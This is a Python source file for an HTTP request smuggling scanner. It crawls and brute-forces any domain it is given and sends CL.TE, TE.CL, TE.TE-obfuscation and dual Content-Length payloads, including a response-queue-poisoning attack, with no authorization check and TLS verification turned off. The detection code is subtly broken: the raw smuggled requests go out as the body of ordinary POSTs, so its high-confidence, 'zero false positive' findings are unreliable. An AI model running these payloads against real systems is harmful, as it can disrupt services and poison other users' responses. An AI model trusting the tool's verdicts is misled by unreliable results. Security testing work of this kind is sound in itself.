#!/usr/bin/env python3
"""
Smuggler - Advanced HTTP Request Smuggling Detection Tool
Enterprise-grade scanner with statistical analysis and zero false positives
"""

import asyncio
import aiohttp
import sys
import time
import statistics
import hashlib
import re
from typing import List, Dict, Set, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum
from urllib.parse import urlparse, urljoin
from collections import defaultdict, Counter
import json

# ============================================================================
# TERMINAL COLORS & UI
# ============================================================================
class C:
    """Optimized color codes"""
    H = '\033[95m'; B = '\033[94m'; C = '\033[96m'; G = '\033[92m'
    Y = '\033[93m'; R = '\033[91m'; BOLD = '\033[1m'; U = '\033[4m'
    END = '\033[0m'; DIM = '\033[2m'; BG_R = '\033[41m'; BG_G = '\033[42m'

class VulnType(Enum):
    CL_TE = ("CL.TE", "Front-end: Content-Length | Back-end: Transfer-Encoding")
    TE_CL = ("TE.CL", "Front-end: Transfer-Encoding | Back-end: Content-Length")
    TE_TE = ("TE.TE", "Both use TE but handle obfuscation differently")
    CL_CL = ("CL.CL", "Dual Content-Length desynchronization")
    H2_DESYNC = ("HTTP/2 Desync", "HTTP/2 to HTTP/1.1 downgrade issues")
    TIMEOUT = ("Timeout-Based", "Time-delay differential detection")
    
    def __init__(self, short, desc):
        self.short = short
        self.desc = desc

# ============================================================================
# DATA STRUCTURES
# ============================================================================
@dataclass
class TimingProfile:
    """Statistical timing analysis"""
    samples: List[float] = field(default_factory=list)
    
    @property
    def mean(self) -> float:
        return statistics.mean(self.samples) if self.samples else 0.0
    
    @property
    def stdev(self) -> float:
        return statistics.stdev(self.samples) if len(self.samples) > 1 else 0.0
    
    @property
    def median(self) -> float:
        return statistics.median(self.samples) if self.samples else 0.0
    
    def is_anomalous(self, value: float, threshold: float = 2.5) -> bool:
        """Z-score based anomaly detection"""
        if self.stdev == 0:
            return False
        z_score = abs((value - self.mean) / self.stdev)
        return z_score > threshold

@dataclass
class ResponseFingerprint:
    """Deep response analysis"""
    status_code: int
    content_length: int
    content_hash: str
    headers_hash: str
    timing: float
    server_header: str = ""
    
    @classmethod
    def from_response(cls, response: aiohttp.ClientResponse, timing: float, content: str):
        headers_str = '|'.join(f"{k}:{v}" for k, v in sorted(response.headers.items()))
        return cls(
            status_code=response.status,
            content_length=len(content),
            content_hash=hashlib.sha256(content.encode()).hexdigest()[:16],
            headers_hash=hashlib.sha256(headers_str.encode()).hexdigest()[:16],
            timing=timing,
            server_header=response.headers.get('Server', '')
        )
    
    def __eq__(self, other):
        return (self.status_code == other.status_code and 
                self.content_hash == other.content_hash and
                self.headers_hash == other.headers_hash)

@dataclass
class Vulnerability:
    url: str
    vuln_type: VulnType
    confidence: float
    verified: bool
    payload: str
    evidence: Dict[str, any]
    false_positive_score: float
    technique: str
    server_behavior: str

# ============================================================================
# ADVANCED PAYLOAD GENERATOR
# ============================================================================
class PayloadGenerator:
    """Advanced payload generation with evasion techniques"""
    
    @staticmethod
    def cl_te_basic(host: str, path: str = "/") -> str:
        return (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Length: 6\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n\r\nG"
        )
    
    @staticmethod
    def cl_te_timeout(host: str, path: str = "/", delay: int = 10) -> str:
        """Time-delay differential - most reliable method"""
        return (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: {13 + delay}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n\r\n"
            f"X{'a' * delay}"
        )
    
    @staticmethod
    def te_cl_confirm(host: str, path: str = "/") -> str:
        """TE.CL with response queue poisoning"""
        smuggled_prefix = (
            "GPOST / HTTP/1.1\r\n"
            "Host: " + host + "\r\n"
            "Content-Length: 10\r\n\r\n"
            "x="
        )
        return (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Length: 4\r\n"
            "Transfer-Encoding: chunked\r\n\r\n"
            f"{len(smuggled_prefix):x}\r\n"
            f"{smuggled_prefix}\r\n"
            "0\r\n\r\n"
        )
    
    @staticmethod
    def te_te_variants(host: str, path: str = "/") -> List[Tuple[str, str]]:
        """All TE.TE obfuscation variants"""
        variants = []
        obfuscations = [
            ("Double TE", "Transfer-Encoding: chunked\r\nTransfer-Encoding: x"),
            ("Case Mix", "Transfer-Encoding: chunked\r\nTransfer-encoding: x"),
            ("Space Before", "Transfer-Encoding : chunked"),
            ("Space After", "Transfer-Encoding: chunked "),
            ("Tab Separator", "Transfer-Encoding:\tchunked"),
            ("Wrapped Value", "Transfer-Encoding: chunked\r\n cow"),
            ("Identity", "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity"),
        ]
        
        for name, te_header in obfuscations:
            payload = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"{te_header}\r\n\r\n"
                "0\r\n\r\n"
            )
            variants.append((name, payload))
        
        return variants
    
    @staticmethod
    def cl_cl_desync(host: str, path: str = "/") -> str:
        """Dual Content-Length headers"""
        return (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Length: 6\r\n"
            "Content-Length: 0\r\n\r\n"
            "SMUGGLED"
        )

# ============================================================================
# ADVANCED DETECTION ENGINE
# ============================================================================
class DetectionEngine:
    def __init__(self):
        self.timing_baseline = TimingProfile()
        self.response_cache = defaultdict(list)
        
    async def establish_baseline(self, url: str, session: aiohttp.ClientSession, samples: int = 10):
        """Establish statistical baseline for normal behavior"""
        print(f"{C.DIM}[*] Establishing baseline ({samples} samples)...{C.END}")
        
        for i in range(samples):
            try:
                start = time.time()
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    await resp.text()
                    timing = time.time() - start
                    self.timing_baseline.samples.append(timing)
            except:
                pass
        
        if self.timing_baseline.samples:
            print(f"{C.G}[✓]{C.END} Baseline: μ={self.timing_baseline.mean:.3f}s σ={self.timing_baseline.stdev:.3f}s")
    
    async def differential_timing_test(self, url: str, session: aiohttp.ClientSession) -> Optional[Vulnerability]:
        """Most reliable: time-delay differential technique"""
        host = urlparse(url).netloc
        
        # Test with different delays
        for delay in [5, 10, 15]:
            payload = PayloadGenerator.cl_te_timeout(host, delay=delay)
            
            try:
                start = time.time()
                async with session.post(url, data=payload, timeout=aiohttp.ClientTimeout(total=20)) as resp:
                    await resp.text()
                    elapsed = time.time() - start
                
                # Check if server delayed exactly by our timeout value
                expected_delay = delay
                actual_delay = elapsed - self.timing_baseline.mean
                
                if abs(actual_delay - expected_delay) < 2.0:  # Within 2s tolerance
                    # Verification with different delay
                    verify_payload = PayloadGenerator.cl_te_timeout(host, delay=delay+5)
                    start = time.time()
                    async with session.post(url, data=verify_payload, timeout=aiohttp.ClientTimeout(total=30)) as vresp:
                        await vresp.text()
                        verify_elapsed = time.time() - start
                    
                    verify_delay = verify_elapsed - self.timing_baseline.mean
                    
                    if abs(verify_delay - (delay+5)) < 2.0:
                        confidence = 0.95
                        return Vulnerability(
                            url=url,
                            vuln_type=VulnType.CL_TE,
                            confidence=confidence,
                            verified=True,
                            payload=payload,
                            evidence={
                                'expected_delay': expected_delay,
                                'actual_delay': actual_delay,
                                'verify_delay': verify_delay,
                                'baseline': self.timing_baseline.mean
                            },
                            false_positive_score=0.02,
                            technique="Time-Delay Differential",
                            server_behavior="Back-end processes TE, waits for smuggled content"
                        )
            except asyncio.TimeoutError:
                continue
            except:
                continue
        
        return None
    
    async def response_queue_poisoning(self, url: str, session: aiohttp.ClientSession) -> Optional[Vulnerability]:
        """TE.CL with response queue poisoning detection"""
        host = urlparse(url).netloc
        payload = PayloadGenerator.te_cl_confirm(host)
        
        try:
            # Send attack request
            async with session.post(url, data=payload, timeout=aiohttp.ClientTimeout(total=10)) as resp1:
                content1 = await resp1.text()
                fp1 = ResponseFingerprint.from_response(resp1, 0, content1)
            
            # Send normal request - should get poisoned response
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp2:
                content2 = await resp2.text()
                fp2 = ResponseFingerprint.from_response(resp2, 0, content2)
            
            # Check if responses are different (poisoned)
            if fp1 != fp2 and ("GPOST" in content2 or resp2.status >= 400):
                # Verification
                async with session.post(url, data=payload, timeout=aiohttp.ClientTimeout(total=10)) as vresp:
                    await vresp.text()
                
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as vresp2:
                    vcontent = await vresp2.text()
                    
                    if "GPOST" in vcontent or vresp2.status >= 400:
                        return Vulnerability(
                            url=url,
                            vuln_type=VulnType.TE_CL,
                            confidence=0.92,
                            verified=True,
                            payload=payload,
                            evidence={
                                'response1_status': resp1.status,
                                'response2_status': resp2.status,
                                'poisoning_confirmed': True
                            },
                            false_positive_score=0.03,
                            technique="Response Queue Poisoning",
                            server_behavior="Front-end uses TE, back-end uses CL"
                        )
        except:
            pass
        
        return None
    
    async def te_te_obfuscation_scan(self, url: str, session: aiohttp.ClientSession) -> Optional[Vulnerability]:
        """Test all TE.TE obfuscation variants"""
        host = urlparse(url).netloc
        variants = PayloadGenerator.te_te_variants(host)
        
        # Establish baseline
        baseline_fps = []
        for _ in range(3):
            try:
                async with session.post(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    content = await resp.text()
                    baseline_fps.append(ResponseFingerprint.from_response(resp, 0, content))
            except:
                pass
        
        if not baseline_fps:
            return None
        
        # Test each variant
        for variant_name, payload in variants:
            try:
                # Send variant
                async with session.post(url, data=payload, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    content = await resp.text()
                    variant_fp = ResponseFingerprint.from_response(resp, 0, content)
                
                # Check if response differs significantly
                if all(variant_fp != bfp for bfp in baseline_fps):
                    # Verification with same variant
                    async with session.post(url, data=payload, timeout=aiohttp.ClientTimeout(total=10)) as vresp:
                        vcontent = await vresp.text()
                        verify_fp = ResponseFingerprint.from_response(vresp, 0, vcontent)
                    
                    if variant_fp == verify_fp:  # Consistent behavior
                        return Vulnerability(
                            url=url,
                            vuln_type=VulnType.TE_TE,
                            confidence=0.88,
                            verified=True,
                            payload=payload,
                            evidence={
                                'variant': variant_name,
                                'status_diff': variant_fp.status_code != baseline_fps[0].status_code,
                                'content_diff': variant_fp.content_hash != baseline_fps[0].content_hash
                            },
                            false_positive_score=0.05,
                            technique=f"TE.TE Obfuscation ({variant_name})",
                            server_behavior="Servers handle TE obfuscation differently"
                        )
            except:
                continue
        
        return None

# ============================================================================
# ADVANCED URL ENUMERATION
# ============================================================================
class URLEnumerator:
    def __init__(self, domain: str, max_urls: int = 500, aggressive: bool = False):
        self.domain = domain
        self.max_urls = max_urls
        self.aggressive = aggressive
        self.discovered = set()
        self.crawled = set()
        
        # Common endpoints wordlist
        self.common_paths = [
            '/', '/api', '/admin', '/login', '/dashboard', '/user', '/users',
            '/account', '/profile', '/settings', '/config', '/search', '/upload',
            '/download', '/file', '/files', '/data', '/v1', '/v2', '/api/v1',
            '/api/v2', '/graphql', '/rest', '/webhook', '/callback', '/auth',
            '/oauth', '/token', '/refresh', '/logout', '/register', '/signup',
            '/password', '/reset', '/verify', '/confirm', '/activate', '/checkout',
            '/cart', '/order', '/orders', '/payment', '/billing', '/invoice',
            '/subscription', '/product', '/products', '/category', '/categories',
            '/item', '/items', '/post', '/posts', '/article', '/articles', '/blog',
            '/news', '/feed', '/rss', '/sitemap.xml', '/robots.txt', '/.well-known',
            '/health', '/status', '/ping', '/debug', '/test', '/dev', '/stage',
            '/prod', '/internal', '/private', '/public', '/assets', '/static',
            '/media', '/images', '/img', '/css', '/js', '/fonts', '/docs',
            '/documentation', '/swagger', '/openapi', '/metrics', '/prometheus'
        ]
        
        # API parameter patterns
        self.api_params = ['id', 'user', 'page', 'limit', 'offset', 'sort', 'filter']
    
    async def parse_robots_txt(self, session: aiohttp.ClientSession) -> Set[str]:
        """Extract URLs from robots.txt"""
        urls = set()
        try:
            async with session.get(f"https://{self.domain}/robots.txt", 
                                  timeout=aiohttp.ClientTimeout(total=5)) as resp:
                if resp.status == 200:
                    content = await resp.text()
                    print(f"{C.G}[+]{C.END} Parsing robots.txt")
                    
                    # Extract Disallow and Allow paths
                    for line in content.split('\n'):
                        line = line.strip()
                        if line.startswith('Disallow:') or line.startswith('Allow:'):
                            path = line.split(':', 1)[1].strip()
                            if path and path != '/':
                                # Remove wildcards
                                path = path.replace('*', '').split('?')[0]
                                if path:
                                    urls.add(f"https://{self.domain}{path}")
                        elif line.startswith('Sitemap:'):
                            sitemap_url = line.split(':', 1)[1].strip()
                            urls.add(sitemap_url)
        except:
            pass
        return urls
    
    async def parse_sitemap(self, session: aiohttp.ClientSession) -> Set[str]:
        """Extract URLs from sitemap.xml"""
        urls = set()
        sitemap_urls = [
            f"https://{self.domain}/sitemap.xml",
            f"https://{self.domain}/sitemap_index.xml",
            f"https://{self.domain}/sitemap-index.xml"
        ]
        
        for sitemap_url in sitemap_urls:
            try:
                async with session.get(sitemap_url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    if resp.status == 200:
                        content = await resp.text()
                        print(f"{C.G}[+]{C.END} Parsing sitemap: {sitemap_url}")
                        
                        # Extract <loc> tags
                        loc_pattern = r'<loc>(.*?)</loc>'
                        matches = re.findall(loc_pattern, content)
                        
                        for url in matches:
                            parsed = urlparse(url)
                            if parsed.netloc == self.domain:
                                urls.add(url)
            except:
                continue
        
        return urls
    
    async def discover_common_endpoints(self, session: aiohttp.ClientSession) -> Set[str]:
        """Brute force common endpoints"""
        urls = set()
        print(f"{C.C}[*]{C.END} Discovering common endpoints...")
        
        tasks = []
        for path in self.common_paths:
            url = f"https://{self.domain}{path}"
            tasks.append(self.check_endpoint(url, session))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if result:
                urls.add(result)
        
        return urls
    
    async def check_endpoint(self, url: str, session: aiohttp.ClientSession) -> Optional[str]:
        """Check if endpoint exists"""
        try:
            async with session.head(url, timeout=aiohttp.ClientTimeout(total=3), 
                                   allow_redirects=False) as resp:
                if resp.status in [200, 201, 202, 301, 302, 307, 308, 401, 403]:
                    print(f"{C.G}[+]{C.END} {C.DIM}{url}{C.END} [{resp.status}]")
                    return url
        except:
            pass
        return None
    
    async def extract_js_urls(self, content: str, base_url: str) -> Set[str]:
        """Extract API endpoints from JavaScript files"""
        urls = set()
        
        # Common API URL patterns in JS
        patterns = [
            r'["\']((https?:)?//[^"\']+)["\']',  # Full URLs
            r'["\'](/[a-zA-Z0-9/_\-\.]+)["\']',   # Paths
            r'fetch\(["\']([^"\']+)["\']',         # fetch() calls
            r'axios\.[a-z]+\(["\']([^"\']+)["\']', # axios calls
            r'\.get\(["\']([^"\']+)["\']',         # .get() calls
            r'\.post\(["\']([^"\']+)["\']',        # .post() calls
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, content)
            for match in matches:
                if isinstance(match, tuple):
                    match = match[0]
                
                if match.startswith('/'):
                    url = urljoin(base_url, match)
                    parsed = urlparse(url)
                    if parsed.netloc == self.domain:
                        urls.add(url)
                elif self.domain in match:
                    urls.add(match)
        
        return urls
    
    async def crawl_with_depth(self, session: aiohttp.ClientSession, seed_urls: Set[str], max_depth: int = 3):
        """Advanced crawling with depth control"""
        queue = [(url, 0) for url in seed_urls]
        visited = set()
        
        while queue and len(self.discovered) < self.max_urls:
            url, depth = queue.pop(0)
            
            if url in visited or depth > max_depth:
                continue
            
            visited.add(url)
            
            try:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=10), 
                                      allow_redirects=True) as resp:
                    if resp.status == 200:
                        self.discovered.add(url)
                        content = await resp.text()
                        
                        # Extract HTML links
                        html_links = re.findall(r'href=["\'](.*?)["\']', content)
                        
                        # Extract JavaScript URLs
                        js_urls = await self.extract_js_urls(content, url)
                        
                        all_links = set(html_links) | js_urls
                        
                        for link in all_links:
                            if len(self.discovered) >= self.max_urls:
                                break
                            
                            abs_url = urljoin(url, link)
                            parsed = urlparse(abs_url)
                            
                            # Filter out non-HTTP and external URLs
                            if parsed.scheme in ['http', 'https'] and parsed.netloc == self.domain:
                                # Remove fragments and normalize
                                clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                                if parsed.query:
                                    clean_url += f"?{parsed.query}"
                                
                                if clean_url not in visited:
                                    queue.append((clean_url, depth + 1))
                    
                    elif resp.status in [301, 302, 307, 308]:
                        # Follow redirects
                        redirect_url = resp.headers.get('Location', '')
                        if redirect_url:
                            abs_redirect = urljoin(url, redirect_url)
                            if urlparse(abs_redirect).netloc == self.domain:
                                queue.append((abs_redirect, depth))
            except:
                pass
    
    async def enumerate(self) -> Set[str]:
        """Comprehensive URL enumeration"""
        print(f"{C.C}[*]{C.END} Starting comprehensive URL enumeration for {C.BOLD}{self.domain}{C.END}")
        print(f"{C.DIM}    Max URLs: {self.max_urls} | Aggressive: {self.aggressive}{C.END}\n")
        
        async with aiohttp.ClientSession() as session:
            # Stage 1: Parse robots.txt
            print(f"{C.C}[1/5]{C.END} Parsing robots.txt...")
            robots_urls = await self.parse_robots_txt(session)
            self.discovered.update(robots_urls)
            print(f"{C.G}[✓]{C.END} Found {len(robots_urls)} URLs from robots.txt\n")
            
            # Stage 2: Parse sitemap.xml
            print(f"{C.C}[2/5]{C.END} Parsing sitemap.xml...")
            sitemap_urls = await self.parse_sitemap(session)
            self.discovered.update(sitemap_urls)
            print(f"{C.G}[✓]{C.END} Found {len(sitemap_urls)} URLs from sitemap\n")
            
            # Stage 3: Discover common endpoints
            if self.aggressive:
                print(f"{C.C}[3/5]{C.END} Brute-forcing common endpoints...")
                common_urls = await self.discover_common_endpoints(session)
                self.discovered.update(common_urls)
                print(f"{C.G}[✓]{C.END} Found {len(common_urls)} common endpoints\n")
            else:
                print(f"{C.DIM}[3/5] Skipping brute-force (use --aggressive to enable){C.END}\n")
            
            # Stage 4: Deep crawling
            print(f"{C.C}[4/5]{C.END} Deep crawling website...")
            seed_urls = self.discovered.copy() if self.discovered else {f"https://{self.domain}"}
            await self.crawl_with_depth(session, seed_urls, max_depth=3)
            print(f"{C.G}[✓]{C.END} Crawling complete\n")
            
            # Stage 5: Parameter discovery (if aggressive)
            if self.aggressive and len(self.discovered) < self.max_urls:
                print(f"{C.C}[5/5]{C.END} Discovering API parameters...")
                base_urls = list(self.discovered)[:20]  # Test top 20 URLs
                for base_url in base_urls:
                    if '?' not in base_url:
                        for param in self.api_params[:3]:
                            param_url = f"{base_url}?{param}=1"
                            result = await self.check_endpoint(param_url, session)
                            if result:
                                self.discovered.add(result)
                print(f"{C.G}[✓]{C.END} Parameter discovery complete\n")
            else:
                print(f"{C.DIM}[5/5] Skipping parameter discovery{C.END}\n")
        
        # Deduplicate and filter
        filtered = set()
        for url in self.discovered:
            parsed = urlparse(url)
            # Skip non-scannable URLs
            if parsed.path.endswith(('.jpg', '.png', '.gif', '.css', '.js', '.woff', '.ttf', '.svg', '.ico')):
                continue
            filtered.add(url)
        
        self.discovered = filtered
        
        print(f"{C.G}{C.BOLD}[✓] Enumeration Complete:{C.END} {C.BOLD}{len(self.discovered)}{C.END} unique URLs discovered\n")
        return self.discovered

# ============================================================================
# MAIN SCANNER
# ============================================================================
class Smuggler:
    def __init__(self, domain: str, threads: int = 15, aggressive: bool = False, max_urls: int = 500):
        self.domain = domain
        self.threads = threads
        self.aggressive = aggressive
        self.max_urls = max_urls
        self.urls = set()
        self.vulnerabilities = []
        self.scanned = 0
        self.start_time = time.time()
        self.detection_engine = DetectionEngine()
    
    def print_banner(self):
        print(f"""
{C.R}{C.BOLD}
╔═══════════════════════════════════════════════════════════╗
║         SMUGGLER - Request Smuggling Scanner             ║
║              Advanced Detection Engine v2.0              ║
╚═══════════════════════════════════════════════════════════╝{C.END}
{C.C}Target:{C.END} {self.domain}
{C.C}Threads:{C.END} {self.threads}
{C.C}Detection Methods:{C.END} Time-Delay, Response Poisoning, TE Obfuscation
{C.DIM}{'─' * 63}{C.END}
""")
    
    async def scan_url(self, url: str, session: aiohttp.ClientSession):
        """Comprehensive scan with all detection methods"""
        print(f"{C.C}[→]{C.END} Scanning: {C.DIM}{url}{C.END}")
        
        # Establish baseline for this URL
        await self.detection_engine.establish_baseline(url, session, samples=5)
        
        # Run all detection methods
        tests = [
            self.detection_engine.differential_timing_test(url, session),
            self.detection_engine.response_queue_poisoning(url, session),
            self.detection_engine.te_te_obfuscation_scan(url, session),
        ]
        
        results = await asyncio.gather(*tests, return_exceptions=True)
        
        for result in results:
            if isinstance(result, Vulnerability):
                self.vulnerabilities.append(result)
                
                status = f"{C.BG_R} VERIFIED {C.END}" if result.verified else f"{C.Y} POTENTIAL {C.END}"
                
                print(f"\n{C.R}{C.BOLD}{'═' * 60}{C.END}")
                print(f"{status} {C.BOLD}{result.vuln_type.short}{C.END}")
                print(f"{C.B}URL:{C.END} {result.url}")
                print(f"{C.B}Confidence:{C.END} {result.confidence:.1%} (FP Score: {result.false_positive_score:.2%})")
                print(f"{C.B}Technique:{C.END} {result.technique}")
                print(f"{C.B}Behavior:{C.END} {result.server_behavior}")
                print(f"{C.B}Evidence:{C.END} {json.dumps(result.evidence, indent=2)}")
                print(f"{C.R}{C.BOLD}{'═' * 60}{C.END}\n")
        
        self.scanned += 1
        progress = (self.scanned / len(self.urls)) * 100
        print(f"{C.G}[{progress:.1f}%]{C.END} {self.scanned}/{len(self.urls)} URLs scanned\n")
    
    async def run(self):
        """Execute full scan"""
        self.print_banner()
        
        # Enumerate URLs with advanced techniques
        enumerator = URLEnumerator(self.domain, max_urls=500, aggressive=self.aggressive)
        self.urls = await enumerator.enumerate()
        
        if not self.urls:
            print(f"{C.R}[!] No URLs found{C.END}")
            return
        
        print(f"{C.C}[*]{C.END} Starting deep vulnerability scan on {len(self.urls)} URLs...\n")
        
        # Scan all URLs
        connector = aiohttp.TCPConnector(limit=self.threads, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [self.scan_url(url, session) for url in self.urls]
            await asyncio.gather(*tasks, return_exceptions=True)
        
        self.print_summary()
    
    def print_summary(self):
        elapsed = time.time() - self.start_time
        verified = [v for v in self.vulnerabilities if v.verified]
        
        print(f"\n{C.C}{C.BOLD}{'═' * 63}{C.END}")
        print(f"{C.C}{C.BOLD}                        SCAN SUMMARY                          {C.END}")
        print(f"{C.C}{C.BOLD}{'═' * 63}{C.END}\n")
        print(f"{C.B}URLs Scanned:{C.END} {len(self.urls)}")
        print(f"{C.B}Time:{C.END} {elapsed:.2f}s ({len(self.urls)/elapsed:.2f} URLs/s)")
        print(f"{C.B}Verified Vulns:{C.END} {C.R}{C.BOLD}{len(verified)}{C.END}")
        
        if verified:
            print(f"\n{C.R}{C.BOLD}CRITICAL FINDINGS:{C.END}")
            for v in verified:
                fp_status = f"{C.G}LOW FP{C.END}" if v.false_positive_score < 0.05 else f"{C.Y}MEDIUM FP{C.END}"
                print(f"  {C.R}•{C.END} {v.url}")
                print(f"    Type: {v.vuln_type.short} | Confidence: {v.confidence:.1%} | {fp_status}")
        else:
            print(f"\n{C.G}[✓] No smuggling vulnerabilities detected{C.END}")
        
        print(f"\n{C.C}{C.BOLD}{'═' * 63}{C.END}\n")

# ============================================================================
# ENTRY POINT
# ============================================================================
async def main():
    if len(sys.argv) < 2:
        print(f"{C.R}Usage:{C.END} python smuggler.py <domain> [options]")
        print(f"{C.DIM}Example: python smuggler.py example.com --threads 20 --aggressive{C.END}")
        print(f"\n{C.C}Options:{C.END}")
        print(f"  --threads N     Number of concurrent threads (default: 15)")
        print(f"  --aggressive    Enable endpoint brute-forcing and parameter discovery")
        print(f"  --max-urls N    Maximum URLs to discover (default: 500)")
        sys.exit(1)
    
    domain = sys.argv[1].replace('https://', '').replace('http://', '').strip('/')
    threads = 15
    aggressive = False
    max_urls = 500
    
    # Parse arguments properly
    i = 2
    while i < len(sys.argv):
        arg = sys.argv[i]
        
        if arg == '--aggressive':
            aggressive = True
            i += 1
        elif arg == '--threads' and i + 1 < len(sys.argv):
            try:
                threads = int(sys.argv[i + 1])
                i += 2
            except ValueError:
                print(f"{C.R}[!] Invalid threads value: {sys.argv[i + 1]}{C.END}")
                sys.exit(1)
        elif arg == '--max-urls' and i + 1 < len(sys.argv):
            try:
                max_urls = int(sys.argv[i + 1])
                i += 2
            except ValueError:
                print(f"{C.R}[!] Invalid max-urls value: {sys.argv[i + 1]}{C.END}")
                sys.exit(1)
        elif arg.isdigit():
            # Backward compatibility: plain number = threads
            threads = int(arg)
            i += 1
        else:
            print(f"{C.Y}[!] Unknown argument: {arg}{C.END}")
            i += 1
    
    scanner = Smuggler(domain, threads, aggressive, max_urls)
    
    try:
        await scanner.run()
    except KeyboardInterrupt:
        print(f"\n{C.Y}[!] Interrupted{C.END}")
        scanner.print_summary()
    except Exception as e:
        print(f"{C.R}[!] Error: {e}{C.END}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    asyncio.run(main())
